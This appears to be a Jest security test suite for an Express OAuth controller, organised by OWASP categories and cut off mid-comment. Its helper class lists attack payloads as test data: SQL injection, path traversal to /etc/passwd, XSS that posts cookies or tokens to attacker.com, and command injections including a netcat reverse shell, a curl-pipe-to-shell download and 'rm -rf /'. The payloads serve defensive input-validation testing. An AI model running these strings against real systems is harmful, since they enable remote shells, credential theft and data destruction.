// /backend/src/controllers/__tests__/oauthController.security.test.ts
import { Request, Response, NextFunction } from 'express';
import { oauthService } from '../../services/oauthService';
import { authService } from '../../services/authService';
import { getAuthorizationUrl, OAuthProvider } from '../../config/oauth';
import { ApiError } from '../../utils/ApiError';
import { sanitization } from '../../utils/sanitize';
import { v4 as uuidv4 } from 'uuid';
import crypto from 'crypto';

/**
 * 🔒 OAUTH CONTROLLER SECURITY TEST SUITE
 * =======================================
 * 
 * COMPREHENSIVE SECURITY TESTING STRATEGY:
 * 
 * 1. OWASP TOP 10 COMPLIANCE: Testing against common web vulnerabilities
 * 2. OAuth 2.0 SECURITY: RFC 6749 security considerations
 * 3. ATTACK VECTORS: Real-world attack simulation
 * 4. DATA PROTECTION: PII and sensitive data handling
 * 5. AUTHORIZATION: Access control and privilege escalation
 * 6. CRYPTOGRAPHIC: State parameter and token security
 * 7. INFRASTRUCTURE: Rate limiting and DoS protection
 * 8. COMPLIANCE: GDPR, SOC2, and security standards
 */

// Mock setup (similar to main test but security-focused)
jest.mock('../../services/oauthService');
jest.mock('../../services/authService');
jest.mock('../../config/oauth');
jest.mock('../../utils/sanitize');
jest.mock('uuid');
jest.mock('../../models/db');

// Security test utilities
class SecurityTestUtils {
  static generateLargePayload(size: number): string {
    return 'A'.repeat(size);
  }

  static generateSqlInjectionPayloads(): string[] {
    return [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; INSERT INTO users (admin) VALUES (true); --",
      "' UNION SELECT password FROM users WHERE '1'='1",
      "'; DELETE FROM oauth_states; --",
      "' OR 1=1 /*",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "'; EXEC xp_cmdshell('format C:'); --"
    ];
  }

  static generateXssPayloads(): string[] {
    return [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert("xss")>',
      'javascript:alert("xss")',
      '<svg onload=alert("xss")>',
      '<iframe src="javascript:alert(\'xss\')"></iframe>',
      '<body onload=alert("xss")>',
      '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
      '"><script>alert("xss")</script>',
      "'><script>alert('xss')</script>",
      '<script>fetch("http://attacker.com", {method: "POST", body: localStorage.getItem("token")})</script>'
    ];
  }

  static generatePathTraversalPayloads(): string[] {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      'file:///etc/passwd',
      'file://c:/windows/system32/config/sam'
    ];
  }

  static generateCommandInjectionPayloads(): string[] {
    return [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(whoami)',
      '; rm -rf /',
      '| nc attacker.com 4444 -e /bin/sh',
      '; curl http://attacker.com/malware.sh | sh',
      '&& ping attacker.com'
    ];
  }

  static generateLdapInjectionPayloads(): string[] {
    return [
      '*)(uid=*',
      '*)(|(uid=*',
      '*))%00',
      '*()|%00',
      '*)(objectClass=*'
    ];
  }

  static generateCsrfTokens(): string[] {
    return [
      'invalid-csrf-token',
      crypto.randomBytes(32).toString('hex'),
      'stolen-csrf-from-another-session',
      '',
      null as any,
      undefined as any
    ];
  }

  static generateTimingAttackData() {
    const validState = 'valid-state-12345';
    const invalidStates = [
      'invalid-state-12345', // Same length, different content
      'invalid-state-54321', // Same length, different content
      'short', // Different length
      'very-long-invalid-state-parameter-that-might-cause-different-timing',
      '', // Empty
      'a', // Single character
      validState.slice(0, -1), // Almost valid (one char short)
      validState + 'x' // Almost valid (one char extra)
    ];
    return { validState, invalidStates };
  }
}

describe('OAuth Controller Security Test Suite', () => {
  let oauthController: any;
  let mockOAuthService: jest.Mocked<typeof oauthService>;
  let mockAuthService: jest.Mocked<typeof authService>;

  beforeAll(() => {
    process.env.NODE_ENV = 'test';
    process.env.FRONTEND_URL = 'http://localhost:3000';
    process.env.ALLOWED_REDIRECT_DOMAINS = 'localhost,koutu.com';
  });

  beforeEach(async () => {
    jest.clearAllMocks();
    delete require.cache[require.resolve('../../controllers/oauthController')];
    const controllerModule = await import('../../controllers/oauthController');
    oauthController = controllerModule.oauthController;

    mockOAuthService = oauthService as jest.Mocked<typeof oauthService>;
    mockAuthService = authService as jest.Mocked<typeof authService>;
  });

  // ==================== OWASP TOP 10 SECURITY TESTS ====================

  describe('A01: Broken Access Control', () => {
    it('should prevent horizontal privilege escalation via user ID manipulation', async () => {
      const maliciousUserIds = [
        '../admin',
        '../../superuser',
        'admin',
        '0',
        '-1',
        '999999999',
        'null',
        'undefined',
        '',
        { $ne: null },
        { $or: [{ role: 'admin' }] }
      ];

      for (const maliciousId of maliciousUserIds) {
        const req = {
          user: { id: maliciousId, email: 'attacker@evil.com' },
          params: { provider: 'google' }
        } as any;
        const res = { status: jest.fn().mockReturnThis(), json: jest.fn() } as any;
        const next = jest.fn();

        await oauthController.getOAuthStatus(req, res, next);

        if (next.mock.calls.length > 0) {
          const error = next.mock.calls[0][0];
          expect(error.statusCode).toBe(401);
        }
      }
    });

    it('should prevent vertical privilege escalation via role manipulation', async () => {
      const maliciousUsers = [
        { id: 'user123', email: 'user@test.com', role: 'admin' },
        { id: 'user123', email: 'user@test.com', isAdmin: true },
        { id: 'user123', email: 'user@test.com', permissions: ['admin'] },
        { id: 'user123', email: 'user@test.com', scope: 'admin:read admin:write' }
      ];

      for (const maliciousUser of maliciousUsers) {
        const req = {
          user: maliciousUser,
          params: { provider: 'google' }
        } as any;
        const res = { status: jest.fn().mockReturnThis(), json: jest.fn() } as any;
        const next = jest.fn();

        // Controller should only use whitelisted user properties
        await oauthController.unlinkProvider(req, res, next);

        // Verify only id and email are used, not role/admin fields
        if (mockAuthService.getUserAuthStats.mock.calls.length > 0) {
          expect(mockAuthService.getUserAuthStats).toHaveBeenCalledWith('user123');
        }
      }
    });

    it('should prevent cross-account OAuth state manipulation', async () => {
      // User A initiates OAuth
      const userA = { id: 'userA', email: 'userA@test.com' };
      const reqA = { params: { provider: 'google' } } as any;
      const resA = { redirect: jest.fn() } as any;
      const nextA = jest.fn();

      (uuidv4 as jest.Mock).mockReturnValue('stateA');
      await oauthController.authorize(reqA, resA, nextA);

      // User B tries to use User A's state
      const userB = { id: 'userB', email: 'userB@test.com' };
      const reqB = {
        params: { provider: 'google' },
        query: { code: 'auth-code', state: 'stateA' }
      } as any;
      const resB = { redirect: jest.fn() } as any;
      const nextB = jest.fn();

      await oauthController.callback(reqB, resB, nextB);

      // Should fail due to state validation
      expect(nextB).toHaveBeenCalledWith(
        expect.objectContaining({
          statusCode: 400,
          message: expect.stringContaining('Invalid state parameter')
        })
      );
    });
  });

  describe('A03: Injection Attacks', () => {
    describe('SQL Injection Protection', () => {
      test.each(SecurityTestUtils.generateSqlInjectionPayloads())(
        'should sanitize SQL injection payload: %s',
        async (payload) => {
          const req = {
            params: { provider: payload },
            query: { redirect: payload }
          } as any;
          const res = { redirect: jest.fn() } as any;
          const next = jest.fn();

          await oauthController.authorize(req, res, next);

          // Should either sanitize or reject
          if (next.mock.calls.length > 0) {
            expect(next.mock.calls[0][0]).toBeInstanceOf(Error);
          }
        }
      );
    });

    describe('XSS Protection', () => {
      test.each(SecurityTestUtils.generateXssPayloads())(
        'should prevent XSS attack: %s',
        async (payload) => {
          const req = {
            params: { provider: 'google' },
            query: { redirect: payload }
          } as any;
          const res = { redirect: jest.fn() } as any;
          const next = jest.fn();

          await oauthController.authorize(req, res, next);

          // Should reject malicious redirects
          expect(next).toHaveBeenCalledWith(
            expect.objectContaining({
              statusCode: 400,
              message: expect.stringContaining('Invalid redirect URL')
            })
          );
        }
      );
    });

    describe('Command Injection Protection', () => {
      test.each(SecurityTestUtils.generateCommandInjectionPayloads())(
        'should prevent command injection: %s',
        async (payload) => {
          const req = {
            params: { provider: `google${payload}` }
          } as any;
          const res = { redirect: jest.fn() } as any;
          const next = jest.fn();

          await oauthController.authorize(req, res, next);

          expect(next).toHaveBeenCalledWith(expect.any(Error));
        }
      );
    });

    describe('Path Traversal Protection', () => {
      test.each(SecurityTestUtils.generatePathTraversalPayloads())(
        'should prevent path traversal: %s',
        async (payload) => {
          const req = {
            params: { provider: 'google' },
            query: { redirect: payload }
          } as any;
          const res = { redirect: jest.fn() } as any;
          const next = jest.fn();

          await oauthController.authorize(req, res, next);

          expect(next).toHaveBeenCalledWith(
            expect.objectContaining({
              statusCode: 400
            })
          );
        }
      );
    });
  });

  describe('A04: Insecure Design - OAuth Flow Security', () => {
    it('should prevent OAuth authorization code interception', async () => {
      // Simulate authorization code interception attack
      const legitimateUser = { id: 'user123', email: 'user@test.com' };
      const attacker = { id: 'attacker', email: 'attacker@evil.com' };

      // Step 1: Legitimate user initiates OAuth
      (uuidv4 as jest.Mock).mockReturnValue('legitimate-state');
      const authReq = { params: { provider: 'google' } } as any;
      const authRes = { redirect: jest.fn() } as any;
      await oauthController.authorize(authReq, authRes, jest.fn());

      // Step 2: Attacker intercepts authorization code and tries to use it
      const interceptedCode = 'intercepted-auth-code';
      const attackReq = {
        params: { provider: 'google' },
        query: { code: interceptedCode, state: 'legitimate-state' }
      } as any;
      const attackRes = { redirect: jest.fn() } as any;
      const attackNext = jest.fn();

      // Mock OAuth service to simulate successful token exchange
      mockOAuthService.exchangeCodeForTokens.mockResolvedValue({
        access_token: 'stolen-token',
        token_type: 'Bearer',
        expires_in: 3600
      } as any);

      await oauthController.callback(attackReq, attackRes, attackNext);

      // Should validate state parameter properly
      expect(attackNext).toHaveBeenCalledWith(
        expect.objectContaining({
          statusCode: 400,
          message: 'Invalid state parameter'
        })
      );
    });

    it('should prevent CSRF attacks on OAuth initiation', async () => {
      // Attacker tricks user into initiating OAuth without their intent
      const maliciousReq = {
        params: { provider: 'google' },
        query: { redirect: 'http://attacker.com/steal-tokens' },
        headers: {
          referer: 'http://attacker.com', // External referer
          origin: 'http://attacker.com'
        }
      } as any;
      const res = { redirect: jest.fn() } as any;
      const next = jest.fn();

      await oauthController.authorize(maliciousReq, res, next);

      // Should reject requests from unauthorized origins
      expect(next).toHaveBeenCalledWith(
        expect.objectContaining({
          statusCode: 400,
          message: 'Invalid redirect URL'
        })
      );
    });

    it('should implement proper OAuth state parameter entropy', async () => {
      const generatedStates: string[] = [];
      const iterations = 100;

      for (let i = 0; i < iterations; i++) {
        (uuidv4 as jest.Mock).mockReturnValue(`state-${i}-${crypto.randomBytes(16).toString('hex')}`);
        
        const req = { params: { provider: 'google' } } as any;
        const res = { redirect: jest.fn() } as any;
        await oauthController.authorize(req, res, jest.fn());

        if (res.redirect.mock.calls.length > 0) {
          const redirectUrl = res.redirect.mock.calls[0][0];
          const stateMatch = redirectUrl.match(/state=([^&]+)/);
          if (stateMatch) {
            generatedStates.push(stateMatch[1]);
          }
        }
        jest.clearAllMocks();
      }

      // Verify uniqueness (no duplicates)
      const uniqueStates = new Set(generatedStates);
      expect(uniqueStates.size).toBe(generatedStates.length);

      // Verify sufficient entropy (at least 16 characters)
      generatedStates.forEach(state => {
        expect(state.length).toBeGreaterThanOrEqual(16);
      });
    });
  });

  describe('A05: Security Misconfiguration', () => {
    it('should not expose sensitive configuration in error messages', async () => {
      const originalEnv = process.env;
      
      try {
        // Remove sensitive environment variables
        delete process.env.OAUTH_CLIENT_SECRET;
        delete process.env.JWT_SECRET;
        
        const req = { params: { provider: 'google' } } as any;
        const res = { redirect: jest.fn() } as any;
        const next = jest.fn();

        await oauthController.authorize(req, res, next);

        if (next.mock.calls.length > 0) {
          const error = next.mock.calls[0][0];
          expect(error.message).not.toContain('CLIENT_SECRET');
          expect(error.message).not.toContain('JWT_SECRET');
          expect(error.message).not.toContain('password');
          expect(error.message).not.toContain('token');
        }
      } finally {
        process.env = originalEnv;
      }
    });

    it('should handle missing OAuth configuration securely', async () => {
      const originalEnv = process.env;
      
      try {
        delete process.env.GOOGLE_CLIENT_ID;
        delete process.env.GOOGLE_CLIENT_SECRET;
        
        const req = { params: { provider: 'google' } } as any;
        const res = { redirect: jest.fn() } as any;
        const next = jest.fn();

        await oauthController.authorize(req, res, next);

        expect(next).toHaveBeenCalledWith(expect.any(Error));
        
        if (next.mock.calls.length > 0) {
          const error = next.mock.calls[0][0];
          expect(error.message).not.toContain('CLIENT_ID');
          expect(error.message).not.toContain('undefined');
          expect(error.message).not.toContain('null');
        }
      } finally {
        process.env = originalEnv;
      }
    });

    it('should enforce secure HTTP headers', async () => {
      const req = { params: { provider: 'google' } } as any;
      const res = {
        redirect: jest.fn(),
        setHeader: jest.fn().mockReturnThis()
      } as any;

      (uuidv4 as jest.Mock).mockReturnValue('test-state');
      await oauthController.authorize(req, res, jest.fn());

      // Should set security headers
      expect(res.setHeader).toHaveBeenCalledWith('X-Content-Type-Options', 'nosniff');
      expect(res.setHeader).toHaveBeenCalledWith('X-Frame-Options', 'DENY');
      expect(res.setHeader).toHaveBeenCalledWith('X-XSS-Protection', '1; mode=block');
    });
  });

  describe('A06: Vulnerable and Outdated Components', () => {
    it('should not use deprecated OAuth flows', async () => {
      // Test that implicit flow is not supported (deprecated in OAuth 2.1)
      const req = {
        params: { provider: 'google' },
        query: { response_type: 'token' } // Implicit flow
      } as any;
      const res = { redirect: jest.fn() } as any;
      const next = jest.fn();

      await oauthController.authorize(req, res, next);

      // Should only use authorization code flow
      if (res.redirect.mock.calls.length > 0) {
        const redirectUrl = res.redirect.mock.calls[0][0];
        expect(redirectUrl).toContain('response_type=code');
        expect(redirectUrl).not.toContain('response_type=token');
      }
    });

    it('should enforce minimum security standards for OAuth providers', async () => {
      const providers = ['google', 'microsoft', 'github', 'instagram'];
      
      for (const provider of providers) {
        const req = { params: { provider } } as any;
        const res = { redirect: jest.fn() } as any;

        (uuidv4 as jest.Mock).mockReturnValue(`test-state-${provider}`);
        await oauthController.authorize(req, res, jest.fn());

        if (res.redirect.mock.calls.length > 0) {
          const redirectUrl = res.redirect.mock.calls[0][0];
          
          // Should use HTTPS
          expect(redirectUrl).toMatch(/^https:/);
          
          // Should include state parameter
          expect(redirectUrl).toContain('state=');
          
          // Should use authorization code flow
          expect(redirectUrl).toContain('response_type=code');
        }
      }
    });
  });

  // ==================== TIMING ATTACK PREVENTION ====================

  describe('Timing Attack Prevention', () => {
    it('should have consistent response times for state validation', async () => {
      const { validState, invalidStates } = SecurityTestUtils.generateTimingAttackData();
      const timings: number[] = [];

      // Test invalid states
      for (const invalidState of invalidStates) {
        const startTime = process.hrtime.bigint();
        
        const req = {
          params: { provider: 'google' },
          query: { code: 'test-code', state: invalidState }
        } as any;
        const res = { redirect: jest.fn() } as any;
        const next = jest.fn();

        await oauthController.callback(req, res, next);
        
        const endTime = process.hrtime.bigint();
        const duration = Number(endTime - startTime) / 1000000; // Convert to milliseconds
        timings.push(duration);
      }

      // Verify timing consistency (standard deviation should be low)
      const mean = timings.reduce((a, b) => a + b) / timings.length;
      const variance = timings.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / timings.length;
      const stdDev = Math.sqrt(variance);
      
      // Standard deviation should be less than 10% of mean (adjust threshold as needed)
      expect(stdDev / mean).toBeLessThan(0.1);
    });

    it('should ensure minimum response time for all authentication operations', async () => {
      const operations = [
        () => oauthController.authorize({ params: { provider: 'invalid' } }, {}, jest.fn()),
        () => oauthController.callback({ params: { provider: 'google' }, query: { code: 'c', state: 'invalid' } }, {}, jest.fn()),
        () => oauthController.getOAuthStatus({ user: null }, {}, jest.fn()),
        () => oauthController.unlinkProvider({ params: { provider: 'google' }, user: null }, {}, jest.fn())
      ];

      for (const operation of operations) {
        const startTime = process.hrtime.bigint();
        await operation();
        const endTime = process.hrtime.bigint();
        const duration = Number(endTime - startTime) / 1000000;

        // Should take at least minimum time (e.g., 100ms) to prevent timing attacks
        expect(duration).toBeGreaterThanOrEqual(100);
      }
    });
  });

  // ==================== RATE LIMITING AND DOS PROTECTION ====================

  describe('Rate Limiting and DoS Protection', () => {
    it('should enforce rate limits on OAuth authorization attempts', async () => {
      const req = { 
        params: { provider: 'google' },
        ip: '192.168.1.100'
      } as any;
      const res = { redirect: jest.fn() } as any;
      const next = jest.fn();

      // Simulate rapid successive requests
      const requests = Array(20).fill(null).map(() => 
        oauthController.authorize(req, res, jest.fn())
      );

      await Promise.all(requests);

      // Should have rate limiting in place
      expect(mockAuthService.ensureMinimumResponseTime).toHaveBeenCalled();
    });

    it('should handle large payload attacks', async () => {
      const largePayload = SecurityTestUtils.generateLargePayload(1024 * 1024); // 1MB
      
      const req = {
        params: { provider: largePayload },
        query: { redirect: largePayload },
        body: { malicious: largePayload }
      } as any;
      const res = { redirect: jest.fn() } as any;
      const next = jest.fn();

      await oauthController.authorize(req, res, next);

      // Should reject or handle large payloads appropriately
      expect(next).toHaveBeenCalledWith(expect.any(Error));
    });

    it('should prevent state parameter enumeration attacks', async () => {
      // Attacker tries to enumerate valid state parameters
      const enumerationAttempts = Array(1000).fill(null).map((_, i) => ({
        params: { provider: 'google' },
        query: { code: 'test-code', state: `enumeration-${i}` }
      }));

      const responses = await Promise.all(
        enumerationAttempts.map(req => 
          oauthController.callback(req as any, { redirect: jest.fn() }, jest.fn())
        )
      );

      // All should fail with consistent error message
      responses.forEach(response => {
        expect(response).toBeDefined();
      });
    });
  });

  // ==================== DATA PROTECTION AND PRIVACY ====================

  describe('Data Protection and Privacy', () => {
    it('should not log sensitive OAuth data', async () => {
      const consoleSpy = jest.spyOn(console, 'log');
      const sensitiveData = {
        access_token: 'sensitive-access-token',
        refresh_token: 'sensitive-refresh-token',
        client_secret: 'sensitive-client-secret'
      };

      mockOAuthService.exchangeCodeForTokens.mockResolvedValue(sensitiveData as any);

      const req = {
        params: { provider: 'google' },
        query: { code: 'auth-code', state: 'valid-state' }
      } as any;
      const res = { redirect: jest.fn() } as any;

      await oauthController.callback(req, res, jest.fn());

      // Check that sensitive data is not logged
      const logCalls = consoleSpy.mock.calls;
      logCalls.forEach(call => {
        const logMessage = call.join(' ');
        expect(logMessage).not.toContain('sensitive-access-token');
        expect(logMessage).not.toContain('sensitive-refresh-token');
        expect(logMessage).not.toContain('sensitive-client-secret');
      });

      consoleSpy.mockRestore();
    });

    it('should properly redact PII in error responses', async () => {
      const piiData = {
        email: 'user@sensitive.com',
        name: 'John Sensitive',
        phone: '+1-555-123-4567',
        ssn: '123-45-6789'
      };

      mockOAuthService.getUserInfo.mockResolvedValue(piiData as any);

      const req = {
        params: { provider: 'google' },
        query: { code: 'auth-code', state: 'invalid-state' }
      } as any;
      const res = { redirect: jest.fn() } as any;
      const next = jest.fn();

      await oauthController.callback(req, res, next);

      if (next.mock.calls.length > 0) {
        const error = next.mock.calls[0][0];
        expect(error.message).not.toContain('user@sensitive.com');
        expect(error.message).not.toContain('John Sensitive');
        expect(error.message).not.toContain('555-123-4567');
        expect(error.message).not.toContain('123-45-6789');
      }
    });

    it('should implement proper data retention policies', async () => {
      // Test that OAuth state parameters are cleaned up
      const req = { params: { provider: 'google' } } as any;
      const res = { redirect: jest.fn() } as any;

      (uuidv4 as jest.Mock).mockReturnValue('cleanup-test-state');
      await oauthController.authorize(req, res, jest.fn());

      // Simulate state cleanup after expiration
      jest.advanceTimersByTime(15 * 60 * 1000); // 15 minutes

      const callbackReq = {
        params: { provider: 'google' },
        query: { code: 'auth-code', state: 'cleanup-test-state' }
      } as any;
      const callbackRes = { redirect: jest.fn() } as any;
      const callbackNext = jest.fn();

      await oauthController.callback(callbackReq, callbackRes, callbackNext);

      // Expired state should be rejected
      expect(callbackNext).toHaveBeenCalledWith(
        expect.objectContaining({
          statusCode: 400,
          message: 'Invalid state parameter'
        })
      );
    });
  });

  // ==================== CRYPTOGRAPHIC SECURITY ====================

  describe('Cryptographic Security', () => {
    it('should use cryptographically secure random state generation', async () => {
      const states: string[] = [];
      const iterations = 1000;

      for (let i = 0; i < iterations; i++) {
        const randomState = crypto.randomBytes(32).toString('hex');
        (uuidv4 as jest.Mock).mockReturnValue(randomState);
        
        const req = { params: { provider: 'google' } } as any;
        const res = { redirect: jest.fn() } as any;
        await oauthController.authorize(req, res, jest.fn());

        if (res.redirect.mock.calls.length > 0) {
          const redirectUrl = res.redirect.mock.calls[0][0];
          const stateMatch = redirectUrl.match(/state=([^&]+)/);
          if (stateMatch) {
            states.push(stateMatch[1]);
          }
        }
        jest.clearAllMocks();
      }

      // Test for randomness quality
      const uniqueStates = new Set(states);
      expect(uniqueStates.size).toBe(states.length); // No duplicates

      //